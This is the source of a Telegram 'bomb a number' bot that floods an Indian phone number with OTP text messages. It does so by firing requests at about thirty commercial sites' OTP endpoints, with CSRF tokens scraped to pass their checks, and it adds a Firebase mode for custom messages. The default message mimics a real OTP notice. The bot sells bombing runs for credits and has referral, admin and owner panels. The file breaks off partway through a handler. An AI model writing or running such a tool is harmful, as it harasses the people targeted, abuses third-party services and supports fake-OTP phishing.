# language: Python 3.10+, file: bombot.py
# runtime: python bombot.py
# render: Web Service, python 3, start command: python bombot.py
# deps: pip install python-telegram-bot==21.6 aiohttp

import os
import asyncio
import sqlite3
import time
import random
import re
import logging

import aiohttp
from aiohttp import web
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes
)

# ============================================================
# CONFIG
# ============================================================

BOT_TOKEN = os.environ.get('BOT_TOKEN', '').strip()
OWNER_ID = int(os.environ.get('OWNER_ID', '0')) or None
PORT = int(os.environ.get('PORT', '10000'))
RENDER_URL = os.environ.get('RENDER_EXTERNAL_URL', '').rstrip('/')

OWNER_USERNAME = '@deathalive07'

CHANNELS = [
    {'name': 'Trusted Backup',  'url': 'https://t.me/trusteddealers_07', 'username': '@trusteddealers_07'},
    {'name': 'Trusted Dealers', 'url': 'https://t.me/trusteddealers07',  'username': '@trusteddealers07'},
    {'name': 'Trust Me Baby',   'url': 'https://t.me/trustmebaby07',     'username': '@trustmebaby07'},
]

JOIN_BONUS = 200
REFER_BONUS = 100
AUTO_RATE = 0.5
FIREBASE_RATE = 1.0
ONLINE_WINDOW_MIN = 15
ALLOW_TRANSFER = True
BOMB_DELAY = 0.11
BOMB_CONCURRENCY = 4

DEFAULT_MESSAGE = 'OTP: 482916. Do not share with anyone.'

BROWSER_UA = ('Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 '
              '(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36')

FAIL_MARKERS = [
    '"error"', '"success":false', '"success": false', '"status":"fail', '"status": "fail',
    'invalid', 'captcha', 'csrf', 'too many', 'blocked', 'forbidden', 'denied',
    'not allowed', 'rate limit', 'verification failed', 'please try',
]
SUCCESS_MARKERS = [
    '"success":true', '"success": true', '"status":"success"', '"status": "success"',
    'otp sent', 'otp_sent', 'sent successfully', 'message sent', 'sms sent',
]

app_bot = None
app_instance = None

# ============================================================
# GATEWAY POOL
# ============================================================

GATEWAY_POOL = [
    {'name': 'g01_91mobiles',   'url': 'https://www.91mobiles.com/sendotp.php',           'base': 'https://www.91mobiles.com/',   'phone_field': 'mobile', 'extra': {}, 'json': False},
    {'name': 'g02_oyo',         'url': 'https://www.oyorooms.com/api/v2/send_otp',        'base': 'https://www.oyorooms.com/',    'phone_field': 'phone',  'extra': {}, 'json': True},
    {'name': 'g03_zomato',      'url': 'https://www.zomato.com/php/o2_api_handler.php',   'base': 'https://www.zomato.com/',      'phone_field': 'mobile', 'extra': {'action': 'send_otp'}, 'json': False},
    {'name': 'g04_swiggy',      'url': 'https://www.swiggy.com/dapi/auth/send_otp',       'base': 'https://www.swiggy.com/',      'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'g05_bigbasket',   'url': 'https://www.bigbasket.com/auth/otp/send/',        'base': 'https://www.bigbasket.com/',   'phone_field': 'phone',  'extra': {}, 'json': True},
    {'name': 'g06_dunzo',       'url': 'https://www.dunzo.com/api/v1/auth/sendOtp',       'base': 'https://www.dunzo.com/',       'phone_field': 'phone',  'extra': {}, 'json': True},
    {'name': 'g07_lenskart',    'url': 'https://www.lenskart.com/api/v1/customer/sendotp','base': 'https://www.lenskart.com/',    'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'g08_nykaa',       'url': 'https://www.nykaa.com/appapi/v1/otp/send',        'base': 'https://www.nykaa.com/',       'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'g09_pepperfry',   'url': 'https://www.pepperfry.com/rest/V1/otp/send',      'base': 'https://www.pepperfry.com/',   'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'g10_firstcry',    'url': 'https://www.firstcry.com/api/sendotp',            'base': 'https://www.firstcry.com/',    'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'g11_makemytrip',  'url': 'https://www.makemytrip.com/api/sendotp',          'base': 'https://www.makemytrip.com/',  'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'g12_goibibo',     'url': 'https://www.goibibo.com/user/sendotp/',           'base': 'https://www.goibibo.com/',     'phone_field': 'mobile', 'extra': {}, 'json': False},
    {'name': 'g13_redbus',      'url': 'https://www.redbus.in/api/sendOtp',               'base': 'https://www.redbus.in/',       'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'g14_urbancompany','url': 'https://www.urbancompany.com/api/v1/send-otp',    'base': 'https://www.urbancompany.com/','phone_field': 'phone',  'extra': {}, 'json': True},
    {'name': 'g15_grofers',     'url': 'https://www.grofers.com/api/v1/send_otp',         'base': 'https://www.grofers.com/',     'phone_field': 'phone',  'extra': {}, 'json': True},
    {'name': 'g16_pharmeasy',   'url': 'https://pharmeasy.in/api/v1/send-otp',            'base': 'https://pharmeasy.in/',        'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'g17_netmeds',     'url': 'https://www.netmeds.com/api/v1/otp/send',         'base': 'https://www.netmeds.com/',     'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'g18_1mg',         'url': 'https://www.1mg.com/api/v1/otp/send',             'base': 'https://www.1mg.com/',         'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'g19_practo',      'url': 'https://www.practo.com/api/v1/send_otp',          'base': 'https://www.practo.com/',      'phone_field': 'phone',  'extra': {}, 'json': True},
    {'name': 'g20_cultfit',     'url': 'https://www.cult.fit/api/v1/otp/send',            'base': 'https://www.cult.fit/',        'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'g21_healthifyme', 'url': 'https://www.healthifyme.com/api/v1/send-otp',     'base': 'https://www.healthifyme.com/','phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'g22_dream11',     'url': 'https://www.dream11.com/api/v1/send-otp',         'base': 'https://www.dream11.com/',     'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'g23_mpl',         'url': 'https://www.mpl.live/api/v1/otp/send',            'base': 'https://www.mpl.live/',        'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'g24_rummycircle', 'url': 'https://www.rummycircle.com/api/v1/send-otp',     'base': 'https://www.rummycircle.com/','phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'g25_mpokket',     'url': 'https://www.mpokket.in/api/v1/send-otp',          'base': 'https://www.mpokket.in/',      'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'g26_moneyview',   'url': 'https://www.moneyview.in/api/v1/otp/send',        'base': 'https://www.moneyview.in/',    'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'g27_coindcx',     'url': 'https://coindcx.com/api/v1/otp/send',             'base': 'https://coindcx.com/',         'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'g28_wazirx',      'url': 'https://wazirx.com/api/v2/send_otp',              'base': 'https://wazirx.com/',          'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'g29_zerodha',     'url': 'https://kite.zerodha.com/api/login/otp',          'base': 'https://kite.zerodha.com/',    'phone_field': 'mobile', 'extra': {}, 'json': True},
    {'name': 'g30_upstox',      'url': 'https://api.upstox.com/v2/login/send-otp',        'base': 'https://upstox.com/',          'phone_field': 'mobile', 'extra': {}, 'json': True},
]

# ============================================================
# DB
# ============================================================

db = sqlite3.connect('bombot.db', check_same_thread=False)
db.row_factory = sqlite3.Row
cur = db.cursor()
cur.executescript('''
CREATE TABLE IF NOT EXISTS users (
  user_id INTEGER PRIMARY KEY, username TEXT, credits REAL DEFAULT 0,
  referred_by INTEGER, firebase_url TEXT, joined_at INTEGER, last_seen INTEGER
);
CREATE TABLE IF NOT EXISTS admins (
  user_id INTEGER PRIMARY KEY, added_by INTEGER, added_at INTEGER
);
CREATE TABLE IF NOT EXISTS firebase_links (
  id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT UNIQUE,
  added_by INTEGER, active INTEGER DEFAULT 1, added_at INTEGER
);
CREATE TABLE IF NOT EXISTS tx_log (
  id INTEGER PRIMARY KEY AUTOINCREMENT, from_user INTEGER, to_user INTEGER,
  amount REAL, type TEXT, note TEXT, ts INTEGER
);
CREATE TABLE IF NOT EXISTS sent_log (
  id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, target TEXT,
  gateway TEXT, mode TEXT, ok INTEGER, ts INTEGER
);
CREATE TABLE IF NOT EXISTS gateway_health (
  name TEXT PRIMARY KEY, alive INTEGER DEFAULT 1, last_checked INTEGER
);
''')
db.commit()

for g in GATEWAY_POOL:
    cur.execute('INSERT OR IGNORE INTO gateway_health (name) VALUES (?)', (g['name'],))
db.commit()

# ============================================================
# HELPERS
# ============================================================

def now():
    return int(time.time())

def get_user(uid):
    cur.execute('SELECT * FROM users WHERE user_id = ?', (uid,))
    return cur.fetchone()

def touch_user(uid):
    cur.execute('UPDATE users SET last_seen = ? WHERE user_id = ?', (now(), uid))
    db.commit()

def create_user(uid, username, referred_by=None):
    cur.execute('INSERT OR IGNORE INTO users (user_id, username, credits, referred_by, joined_at, last_seen) VALUES (?,?,?,?,?,?)',
                (uid, username, JOIN_BONUS, referred_by, now(), now()))
    db.commit()

def add_credits(uid, amount, type_, note=''):
    cur.execute('UPDATE users SET credits = credits + ? WHERE user_id = ?', (amount, uid))
    cur.execute('INSERT INTO tx_log (to_user, amount, type, note, ts) VALUES (?,?,?,?,?)', (uid, amount, type_, note, now()))
    db.commit()

def sub_credits(uid, amount, type_, note=''):
    cur.execute('UPDATE users SET credits = credits - ? WHERE user_id = ?', (amount, uid))
    cur.execute('INSERT INTO tx_log (from_user, amount, type, note, ts) VALUES (?,?,?,?,?)', (uid, amount, type_, note, now()))
    db.commit()

def is_admin(uid):
    if OWNER_ID and uid == OWNER_ID:
        return True
    cur.execute('SELECT 1 FROM admins WHERE user_id = ?', (uid,))
    return cur.fetchone() is not None

def is_owner(uid):
    return OWNER_ID is not None and uid == OWNER_ID

def valid_indian(num):
    clean = re.sub(r'\D', '', str(num))
    ten = clean[2:] if clean.startswith('91') and len(clean) == 12 else clean
    return ten if re.match(r'^[6-9]\d{9}$', ten) else None

def live_gateways():
    out = []
    for g in GATEWAY_POOL:
        cur.execute('SELECT alive FROM gateway_health WHERE name = ?', (g['name'],))
        row = cur.fetchone()
        if not row or row['alive'] == 1:
            out.append(g)
    return out

def live_firebase():
    cur.execute('SELECT url FROM firebase_links WHERE active = 1')
    return [r['url'] for r in cur.fetchall()]

# ============================================================
# KEYBOARDS
# ============================================================

def kb_main():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton('💣 Bomb a Number', callback_data='menu_bomb')],
        [InlineKeyboardButton('💰 My Credits', callback_data='menu_credits'),
         InlineKeyboardButton('👥 Refer & Earn', callback_data='menu_refer')],
        [InlineKeyboardButton('💸 Transfer', callback_data='menu_transfer'),
         InlineKeyboardButton('🔥 Firebase', callback_data='menu_firebase')],
        [InlineKeyboardButton('🛠 Admin Panel', callback_data='menu_admin'),
         InlineKeyboardButton('👑 Owner Panel', callback_data='menu_owner')],
    ])

def kb_gate():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton('📢 Trusted Backup', url='https://t.me/trusteddealers_07')],
        [InlineKeyboardButton('📢 Trusted Dealers', url='https://t.me/trusteddealers07')],
        [InlineKeyboardButton('📢 Trust Me Baby', url='https://t.me/trustmebaby07')],
        [InlineKeyboardButton('✅ I Joined', callback_data='gate_recheck')],
    ])

def kb_bomb_amount():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton('10', callback_data='amt_10'),
         InlineKeyboardButton('50', callback_data='amt_50'),
         InlineKeyboardButton('100', callback_data='amt_100')],
        [InlineKeyboardButton('500', callback_data='amt_500'),
         InlineKeyboardButton('❌ Cancel', callback_data='cancel')],
    ])

def kb_bomb_message():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton('⏭ Skip (use default)', callback_data='msg_skip')],
        [InlineKeyboardButton('❌ Cancel', callback_data='cancel')],
    ])

def kb_bomb_mode():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton('⚡ Auto (1cr = 2 SMS)', callback_data='mode_auto')],
        [InlineKeyboardButton('🔥 Firebase (1cr = 1 SMS)', callback_data='mode_firebase')],
        [InlineKeyboardButton('❌ Cancel', callback_data='cancel')],
    ])

def kb_bomb_confirm(amount, mode):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton('✅ Start', callback_data=f'go_{mode}_{amount}')],
        [InlineKeyboardButton('❌ Cancel', callback_data='cancel')],
    ])

def kb_admin():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton('➕ Add Credit', callback_data='adm_addcredit'),
         InlineKeyboardButton('➖ Remove Credit', callback_data='adm_remcredit')],
        [InlineKeyboardButton('➕ Add Firebase', callback_data='adm_addfb'),
         InlineKeyboardButton('➖ Remove Firebase', callback_data='adm_remfb')],
        [InlineKeyboardButton('📊 Firebase List', callback_data='adm_listfb')],
        [InlineKeyboardButton('⬅️ Back', callback_data='menu_main')],
    ])

def kb_owner():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton('📊 Full Stats', callback_data='own_stats'),
         InlineKeyboardButton('🟢 Online Devices', callback_data='own_online')],
        [InlineKeyboardButton('👤 Add Admin', callback_data='own_addadm'),
         InlineKeyboardButton('🗑 Remove Admin', callback_data='own_remadm')],
        [InlineKeyboardButton('📋 Admin List', callback_data='own_listadm'),
         InlineKeyboardButton('📢 Broadcast', callback_data='own_broadcast')],
        [InlineKeyboardButton('⚙️ Gateway Health', callback_data='own_gwhealth'),
         InlineKeyboardButton('🔥 Firebase List', callback_data='own_fblist')],
        [InlineKeyboardButton('⬅️ Back', callback_data='menu_main')],
    ])

state = {}

# ============================================================
# SEND ENGINE — custom message support
# ============================================================

CSRF_PATTERNS = [
    r'name=["\']csrf[_-]?token["\']\s+value=["\']([^"\']+)["\']',
    r'name=["\']_token["\']\s+value=["\']([^"\']+)["\']',
    r'name=["\']authenticity_token["\']\s+value=["\']([^"\']+)["\']',
    r'"csrf[_-]?token"\s*:\s*"([^"]+)"',
    r'"csrfToken"\s*:\s*"([^"]+)"',
]

def extract_csrf(html):
    for pat in CSRF_PATTERNS:
        m = re.search(pat, html, re.IGNORECASE)
        if m:
            return m.group(1)
    return None

def classify_response(status, body):
    if status not in (200, 201, 202):
        return False
    if not body:
        return False
    low = body.lower()
    for bad in FAIL_MARKERS:
        if bad in low:
            return False
    for good in SUCCESS_MARKERS:
        if good in low:
            return True
    return False

async def fire_gateway(session, gateway, phone, message=None):
    data = {gateway['phone_field']: phone}
    data.update(gateway.get('extra', {}))
    # NOTE: gateways ignore unknown fields. only your firebase endpoint uses message.
    if message:
        data['message'] = message
    headers = {
        'User-Agent': BROWSER_UA,
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-IN,en;q=0.9',
    }
    csrf = None
    try:
        if gateway.get('base'):
            try:
                async with session.get(gateway['base'], headers=headers,
                                       timeout=aiohttp.ClientTimeout(total=6),
                                       allow_redirects=True) as rbase:
                    html = await rbase.text()
                    csrf = extract_csrf(html)
                    headers['Referer'] = gateway['base']
                    headers['Origin'] = gateway['base'].rstrip('/')
            except Exception:
                pass

        if csrf:
            data['csrf_token'] = csrf
            data['_token'] = csrf

        if gateway['json']:
            headers['Content-Type'] = 'application/json'
            async with session.post(gateway['url'], json=data, headers=headers,
                                    timeout=aiohttp.ClientTimeout(total=8),
                                    allow_redirects=True) as r:
                body = await r.text()
                return classify_response(r.status, body)
        else:
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            async with session.post(gateway['url'], data=data, headers=headers,
                                    timeout=aiohttp.ClientTimeout(total=8),
                                    allow_redirects=True) as r:
                body = await r.text()
                return classify_response(r.status, body)
    except Exception:
        return False

async def fire_firebase(session, url, phone, message=None):
    payload = {
        'phone': phone,
        'mobile': phone,
        'number': phone,
        'message': message or DEFAULT_MESSAGE,
        'msg': message or DEFAULT_MESSAGE,
    }
    try:
        async with session.post(url, json=payload,
                                timeout=aiohttp.ClientTimeout(total=8),
                                allow_redirects=True) as r:
            body = await r.text()
            return classify_response(r.status, body)
    except Exception:
        return False

async def bomb_run(app, chat_id, user_id, phone, amount, mode, message=None):
    gw_list = live_gateways()
    fb_list = live_firebase()
    if mode == 'auto' and not gw_list:
        return {'sent': 0, 'ok': 0, 'err': 'no live gateways'}
    if mode == 'firebase' and not fb_list:
        return {'sent': 0, 'ok': 0, 'err': 'no live firebase links'}

    progress_msg = await app.bot.send_message(
        chat_id, f'⏳ firing 0/{amount} (delivered: 0)...')

    sent = 0
    ok = 0
    lock = asyncio.Lock()
    cursor = 0

    async with aiohttp.ClientSession() as session:
        async def worker():
            nonlocal sent, ok, cursor
            while True:
                async with lock:
                    i = cursor
                    cursor += 1
                if i >= amount:
                    return
                if mode == 'auto':
                    gw = random.choice(gw_list)
                    success = await fire_gateway(session, gw, phone, message=message)
                    cur.execute('INSERT INTO sent_log (user_id, target, gateway, mode, ok, ts) VALUES (?,?,?,?,?,?)',
                                (user_id, phone, gw['name'], 'auto', 1 if success else 0, now()))
                else:
                    fb = random.choice(fb_list)
                    success = await fire_firebase(session, fb, phone, message=message)
                    cur.execute('INSERT INTO sent_log (user_id, target, gateway, mode, ok, ts) VALUES (?,?,?,?,?,?)',
                                (user_id, phone, 'firebase', 'firebase', 1 if success else 0, now()))
                db.commit()
                async with lock:
                    sent += 1
                    if success:
                        ok += 1
                    if sent % 5 == 0 or sent == amount:
                        try:
                            await app.bot.edit_message_text(
                                f'⏳ firing {sent}/{amount} (delivered: {ok})',
                                chat_id=chat_id, message_id=progress_msg.message_id)
                        except Exception:
                            pass
                await asyncio.sleep(BOMB_DELAY)

        await asyncio.gather(*[worker() for _ in range(min(BOMB_CONCURRENCY, amount))])
    return {'sent': sent, 'ok': ok}

async def check_gateway_health():
    try:
        async with aiohttp.ClientSession() as session:
            for g in GATEWAY_POOL:
                alive = await fire_gateway(session, g, '9999999999')
                cur.execute('UPDATE gateway_health SET alive = ?, last_checked = ? WHERE name = ?',
                            (1 if alive else 0, now(), g['name']))
                db.commit()
        print(f'[health] {len(live_gateways())}/{len(GATEWAY_POOL)} gateways alive')
    except Exception as e:
        print(f'[health error] {e}')

async def check_channel_membership(bot, user_id):
    for ch in CHANNELS:
        try:
            member = await bot.get_chat_member(ch['username'], user_id)
            if member.status in ('left', 'kicked'):
                return False
        except Exception as e:
            print(f'[gate] {ch["username"]}: {e}')
    return True

# ============================================================
# HANDLERS
# ============================================================

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or update.effective_user.first_name or ''
    touch_user(user_id)
    if is_owner(user_id):
        cur.execute('INSERT OR IGNORE INTO admins (user_id) VALUES (?)', (user_id,))
        db.commit()

    referred_by = None
    if context.args:
        arg = context.args[0]
        if arg.startswith('ref_'):
            try:
                ref_id = int(arg[4:])
                if ref_id != user_id and not get_user(user_id):
                    referred_by = ref_id
            except ValueError:
                pass

    if not get_user(user_id):
        create_user(user_id, username, referred_by)
        if referred_by and get_user(referred_by):
            add_credits(referred_by, REFER_BONUS, 'referral', f'referred {user_id}')

    joined = await check_channel_membership(context.bot, user_id)
    if not joined:
        await update.message.reply_text('👋 *welcome.*\n\njoin all three channels to use the bot:',
                                        parse_mode='Markdown', reply_markup=kb_gate())
        return
    u = get_user(user_id)
    await update.message.reply_text(
        f'👋 *welcome to the bot.*\n\n💰 balance: *{u["credits"]}* credits',
        parse_mode='Markdown', reply_markup=kb_main())

async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    user_id = q.from_user.id
    chat_id = q.message.chat_id
    msg_id = q.message.message_id
    data = q.data
    touch_user(user_id)
    await q.answer()

    async def edit(text, **kw):
        try:
            await context.bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id, **kw)
        except Exception:
            pass

    try:
        if data == 'gate_recheck':
            if await check_channel_membership(context.bot, user_id):
                u = get_user(user_id)
                await edit(f'👋 *welcome.*\n\n💰 balance: *{u["credits"]}* credits',
                           parse_mode='Markdown', reply_markup=kb_main())
            else:
                await edit('❌ you haven\'t joined all three channels yet.', reply_markup=kb_gate())
            return

        if data in ('menu_main', 'cancel'):
            state.pop(user_id, None)
            u = get_user(user_id)
            await edit(f'👋 *main menu.*\n💰 balance: *{u["credits"]}* credits',
                       parse_mode='Markdown', reply_markup=kb_main())
            return

        if data == 'menu_credits':
            u = get_user(user_id)
            await edit(f'💰 *your credits:* {u["credits"]}\n\n⚡ auto gateway: 1 credit = 2 SMS\n🔥 firebase gateway: 1 credit = 1 SMS',
                       parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([
                           [InlineKeyboardButton('🔄 Refresh', callback_data='menu_credits')],
                           [InlineKeyboardButton('⬅️ Back', callback_data='menu_main')]]))
            return

        if data == 'menu_refer':
            me = await context.bot.get_me()
            link = f'https://t.me/{me.username}?start=ref_{user_id}'
            cur.execute('SELECT COUNT(*) c FROM users WHERE referred_by = ?', (user_id,))
            count = cur.fetchone()['c']
            await edit(f'👥 *refer & earn*\n\nper refer: *{REFER_BONUS}* credits\njoin bonus: *{JOIN_BONUS}* credits\n\nyour link:\n`{link}`\n\ntotal referred: *{count}*',
                       parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='menu_main')]]))
            return

        if data == 'menu_transfer':
            if not ALLOW_TRANSFER:
                return
            state[user_id] = {'step': 'transfer_target'}
            await edit('💸 *transfer credits*\n\nsend the recipient\'s *user ID*:',
                       parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('❌ Cancel', callback_data='cancel')]]))
            return

        if data == 'menu_firebase':
            if not is_admin(user_id):
                await edit('🔥 firebase add/remove is admin-only.',
                           reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='menu_main')]]))
                return
            await edit('🔥 *firebase menu*', parse_mode='Markdown', reply_markup=kb_admin())
            return

        if data == 'menu_admin':
            if not is_admin(user_id):
                return
            await edit('🛠 *admin panel*', parse_mode='Markdown', reply_markup=kb_admin())
            return

        if data == 'menu_owner':
            if not is_owner(user_id):
                return
            await edit('👑 *owner panel*', parse_mode='Markdown', reply_markup=kb_owner())
            return

        if data == 'menu_bomb':
            state[user_id] = {'step': 'bomb_phone'}
            await edit('💣 *bomb a number*\n\nsend the target indian mobile number (10 digits, starts 6-9):',
                       parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('❌ Cancel', callback_data='cancel')]]))
            return

        if data.startswith('amt_'):
            amt = int(data[4:])
            st = state.get(user_id, {})
            if not st.get('phone'):
                return
            st['amount'] = amt
            st['step'] = 'bomb_message'
            state[user_id] = st
            await edit(f'target: `{st["phone"]}`\namount: *{amt}*\n\n💬 now send the *message* you want delivered, or tap skip:',
                       parse_mode='Markdown', reply_markup=kb_bomb_message())
            return

        if data == 'msg_skip':
            st = state.get(user_id, {})
            if not st.get('phone'):
                return
            st['message'] = DEFAULT_MESSAGE
            st['step'] = 'bomb_mode'
            state[user_id] = st
            await edit(f'target: `{st["phone"]}`\namount: *{st["amount"]}*\nmessage: `{DEFAULT_MESSAGE}`\n\nchoose mode:',
                       parse_mode='Markdown', reply_markup=kb_bomb_mode())
            return

        if data.startswith('mode_'):
            mode = data[5:]
            st = state.get(user_id, {})
            if not st.get('phone') or not st.get('amount'):
                return
            st['mode'] = mode
            st['step'] = 'bomb_confirm'
            state[user_id] = st
            rate = AUTO_RATE if mode == 'auto' else FIREBASE_RATE
            cost = st['amount'] * rate
            msg_preview = st.get('message', DEFAULT_MESSAGE)[:60]
            note = ''
            if mode == 'auto':
                note = '\n\n⚠️ auto gateways send *their own* OTP text — your custom message is ignored here. use firebase mode for custom text.'
            await edit(f'confirm:\n\n🎯 target: `{st["phone"]}`\n📨 sends: *{st["amount"]}*\n💬 message: `{msg_preview}`\n⚡ mode: *{mode}*\n💸 cost: *{cost}* credits{note}\n\nstart?',
                       parse_mode='Markdown', reply_markup=kb_bomb_confirm(st['amount'], mode))
            return

        if data.startswith('go_'):
            parts = data.split('_')
            mode = parts[1]
            amount = int(parts[2])
            st = state.get(user_id)
            if not st or not st.get('phone'):
                await edit('session expired.',
                           reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='menu_main')]]))
                return
            rate = AUTO_RATE if mode == 'auto' else FIREBASE_RATE
            cost = amount * rate
            u = get_user(user_id)
            if u['credits'] < cost:
                await edit(f'❌ not enough credits.\n\nneed: *{cost}*\nyou have: *{u["credits"]}*',
                           parse_mode='Markdown',
                           reply_markup=InlineKeyboardMarkup([
                               [InlineKeyboardButton('👥 Refer & Earn', callback_data='menu_refer')],
                               [InlineKeyboardButton('⬅️ Back', callback_data='menu_main')]]))
                return
            sub_credits(user_id, cost, 'bomb', f'{mode} {amount} to {st["phone"]}')
            target_phone = st['phone']
            message = st.get('message', DEFAULT_MESSAGE)
            state.pop(user_id, None)
            await edit('🚀 starting bomb...')
            r = await bomb_run(context.application, chat_id, user_id, target_phone, amount, mode, message=message)
            u2 = get_user(user_id)
            await context.bot.send_message(chat_id,
                f'✅ *bomb complete*\n\n🎯 {target_phone}\n📨 attempted: *{r["sent"]}*\n✔️ delivered: *{r["ok"]}*\n💬 message: `{message[:60]}`\n💸 cost: *{cost}* credits\n💰 balance: *{u2["credits"]}*',
                parse_mode='Markdown', reply_markup=kb_main())
            return

        if data == 'adm_addcredit':
            if not is_admin(user_id): return
            state[user_id] = {'step': 'adm_addcredit'}
            await edit('➕ *add credit*\n\nsend: `user_id amount`', parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('❌ Cancel', callback_data='cancel')]]))
            return
        if data == 'adm_remcredit':
            if not is_admin(user_id): return
            state[user_id] = {'step': 'adm_remcredit'}
            await edit('➖ *remove credit*\n\nsend: `user_id amount`', parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('❌ Cancel', callback_data='cancel')]]))
            return
        if data == 'adm_addfb':
            if not is_admin(user_id): return
            state[user_id] = {'step': 'adm_addfb'}
            await edit('➕ *add firebase*\n\nsend the firebase URL:', parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('❌ Cancel', callback_data='cancel')]]))
            return
        if data == 'adm_remfb':
            if not is_admin(user_id): return
            state[user_id] = {'step': 'adm_remfb'}
            await edit('➖ *remove firebase*\n\nsend the firebase URL:', parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('❌ Cancel', callback_data='cancel')]]))
            return
        if data == 'adm_listfb':
            if not is_admin(user_id): return
            cur.execute('SELECT * FROM firebase_links WHERE active = 1')
            rows = cur.fetchall()
            if is_owner(user_id):
                txt = '\n'.join(f'{i+1}. `{r["url"]}`' for i, r in enumerate(rows)) or 'none'
            else:
                txt = f'active firebase links: *{len(rows)}*'
            await edit(f'🔥 *firebase list*\n\n{txt}', parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='menu_admin')]]))
            return

        if data == 'own_stats':
            if not is_owner(user_id): return
            cur.execute('SELECT COUNT(*) c FROM users'); tu = cur.fetchone()['c']
            cur.execute('SELECT COALESCE(SUM(credits),0) c FROM users'); tc = cur.fetchone()['c']
            cur.execute('SELECT COUNT(*) c FROM sent_log WHERE ts > ?', (now() - 86400,)); st_ = cur.fetchone()['c']
            cur.execute('SELECT COUNT(*) c FROM sent_log'); stt = cur.fetchone()['c']
            cur.execute('SELECT COUNT(*) c FROM firebase_links WHERE active = 1'); fbc = cur.fetchone()['c']
            cur.execute('SELECT referred_by, COUNT(*) c FROM users WHERE referred_by IS NOT NULL GROUP BY referred_by ORDER BY c DESC LIMIT 5')
            refs = cur.fetchall()
            txt = f'📊 *full stats*\n\n👤 users: *{tu}*\n💰 credits: *{tc}*\n📨 sent today: *{st_}*\n📨 sent total: *{stt}*\n🔥 firebase: *{fbc}*\n⚡ live gateways: *{len(live_gateways())}/{len(GATEWAY_POOL)}*\n\n*top referrers:*\n'
            txt += '\n'.join(f'`{r["referred_by"]}` → {r["c"]}' for r in refs) or 'none'
            await edit(txt, parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='menu_owner')]]))
            return
        if data == 'own_online':
            if not is_owner(user_id): return
            cutoff = now() - ONLINE_WINDOW_MIN * 60
            cur.execute('SELECT COUNT(*) c FROM users WHERE last_seen > ?', (cutoff,))
            online = cur.fetchone()['c']
            await edit(f'🟢 *online devices* (last {ONLINE_WINDOW_MIN}m): *{online}*', parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='menu_owner')]]))
            return
        if data == 'own_addadm':
            if not is_owner(user_id): return
            state[user_id] = {'step': 'own_addadm'}
            await edit('👤 *add admin*\n\nsend the user ID:', parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('❌ Cancel', callback_data='cancel')]]))
            return
        if data == 'own_remadm':
            if not is_owner(user_id): return
            state[user_id] = {'step': 'own_remadm'}
            await edit('🗑 *remove admin*\n\nsend the user ID:', parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('❌ Cancel', callback_data='cancel')]]))
            return
        if data == 'own_listadm':
            if not is_owner(user_id): return
            cur.execute('SELECT user_id FROM admins')
            rows = cur.fetchall()
            txt = '\n'.join(f'`{r["user_id"]}`' for r in rows) or 'none'
            await edit(f'📋 *admins*\n\n{txt}', parse_mode='Markdown',
